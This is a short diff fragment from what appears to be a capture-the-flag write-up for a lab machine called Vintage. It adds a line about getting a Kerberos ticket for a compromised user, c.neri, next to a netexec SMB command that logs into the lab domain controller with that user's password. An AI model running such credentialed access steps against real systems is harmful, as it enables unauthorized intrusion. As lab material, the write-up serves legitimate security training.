@@ -289,6 +289,8 @@ This user is compromised
 The user `c.neri` is part of the remote management users group
 
 # Evil-winrm as `c.neri`
+Ill start by getting a TGT for the user `c.neri`
+
 ```python
 sudo nxc smb dc01.vintage.htb -u 'c.neri' -p 'Zer0the0ne' --generate-krb5-file /etc/krb5.conf -k
 SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
